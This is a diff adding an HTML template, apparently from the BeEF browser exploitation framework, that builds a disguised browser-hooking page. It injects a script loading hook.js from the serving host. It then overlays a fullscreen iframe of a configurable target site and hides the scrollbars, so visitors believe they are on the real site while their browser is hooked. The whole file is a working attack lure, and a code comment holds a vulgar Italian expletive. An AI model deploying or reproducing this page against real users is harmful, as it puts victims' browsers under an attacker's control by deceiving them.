@@ -1,0 +1,18 @@
+<html>
+<head>
+	<title><%= @customhook_title %></title>
+	<script>
+		var commandModuleStr = '<script src="' + window.location.protocol + '//' + window.location.host + '/hook.js" type="text/javascript"><\/script>';
+		document.write(commandModuleStr);
+	</script>
+</head>
+
+<body>
+	<script>
+		setTimeout("beef.dom.createIframe('fullscreen','get',{'src':'<%= @customhook_target %>'},{},null)",2000);
+		document.body.scroll = "no";
+		document.documentElement.style.overflow = 'hidden';
+		//Porco dio - and away we go!
+	</script>
+</body>
+</html>
